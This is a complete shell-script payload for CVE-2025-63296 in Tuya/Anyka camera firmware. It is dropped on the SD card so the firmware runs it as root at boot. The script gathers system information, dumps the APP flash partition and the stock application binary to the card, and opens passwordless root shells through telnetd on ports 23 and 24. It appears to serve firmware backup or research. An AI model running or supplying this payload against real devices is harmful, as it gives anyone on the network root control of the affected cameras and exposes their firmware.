#!/bin/sh
# update.nor.sh - CVE-2025-63296 trigger payload for Tuya/Anyka v33.53.x firmware.
#
# The firmware's /usr/bin/update_entry finds this file at the SD card root,
# copies it to /tmp/net.sh, chmods it 777, and /usr/sbin/anyka_service.sh runs it
# as root at boot.
#
# It dumps the APP partition (mtd7) straight to the SD card and starts telnetd.
# READ-ONLY on flash: it only reads /dev/mtdN.

SD=/mnt
LOG="$SD/update-report.txt"

log() { echo "$*" >> "$LOG" 2>/dev/null; }

# A previous run already produced the image? Do not redo 5 MB.
if [ -f "$SD/backup_app.bin" ]; then
    SZ=$(wc -c < "$SD/backup_app.bin" 2>/dev/null)
    if [ "$SZ" = "5242880" ]; then
        log "$(date) already dumped ($SZ bytes), skipping"
        exit 0
    fi
fi

log "=== update.nor.sh start $(date) ==="
log "id     : $(id 2>&1)"
log "pwd    : $(pwd 2>&1)"
log "--- mount ---"
mount >> "$LOG" 2>&1
log "--- /proc/mtd ---"
cat /proc/mtd >> "$LOG" 2>&1
log "--- /dev/mtd* ---"
ls -l /dev/mtd* >> "$LOG" 2>&1

# Locate the APP partition (fall back to mtd7).
APP_DEV=""
while read -r line; do
    case "$line" in
        *'"APP"'*)
            idx=${line%%:*}
            idx=${idx#mtd}
            APP_DEV="/dev/mtd$idx"
            ;;
    esac
done < /proc/mtd
[ -n "$APP_DEV" ] || APP_DEV=/dev/mtd7
log "APP device: $APP_DEV"

dd if="$APP_DEV" of="$SD/backup_app.bin" bs=65536 >> "$LOG" 2>&1
sync
log "backup_app.bin: $(wc -c < "$SD/backup_app.bin" 2>/dev/null) bytes"
log "backup_app.bin md5: $(md5sum "$SD/backup_app.bin" 2>/dev/null | cut -d' ' -f1)"

# Stock application binary (the file the issue compares by MD5).
for p in /usr/bin/anyka_ipc /usr/sbin/anyka_ipc /app/anyka_ipc /bin/anyka_ipc; do
    if [ -f "$p" ]; then
        cat "$p" > "$SD/anyka_ipc_stock.bin"
        log "anyka_ipc: $p -> $(wc -c < "$SD/anyka_ipc_stock.bin") bytes"
        log "anyka_ipc md5: $(md5sum "$SD/anyka_ipc_stock.bin" 2>/dev/null | cut -d' ' -f1)"
        break
    fi
done

# Product identity strings.
if [ -f "$SD/anyka_ipc_stock.bin" ]; then
    log "--- HT_IPC strings ---"
    tr -c '[:print:]' '\n' < "$SD/anyka_ipc_stock.bin" | grep 'HT_IPC' | sort -u | head -n 10 >> "$LOG" 2>&1
fi

# Root shell over telnet, as a bonus.
if command -v telnetd >/dev/null 2>&1; then
    telnetd -p 23 -l /bin/sh >> "$LOG" 2>&1 &
    telnetd -p 24 -l /bin/sh >> "$LOG" 2>&1 &
    log "telnetd started (23/24)"
elif [ -x /usr/sbin/telnetd ]; then
    /usr/sbin/telnetd -p 23 -l /bin/sh >> "$LOG" 2>&1 &
    /usr/sbin/telnetd -p 24 -l /bin/sh >> "$LOG" 2>&1 &
    log "telnetd started via /usr/sbin/telnetd"
elif [ -x /bin/busybox ]; then
    /bin/busybox telnetd -p 23 -l /bin/sh >> "$LOG" 2>&1 &
    /bin/busybox telnetd -p 24 -l /bin/sh >> "$LOG" 2>&1 &
    log "telnetd started via busybox"
else
    log "no telnetd found"
fi

log "=== update.nor.sh end $(date) ==="
exit 0
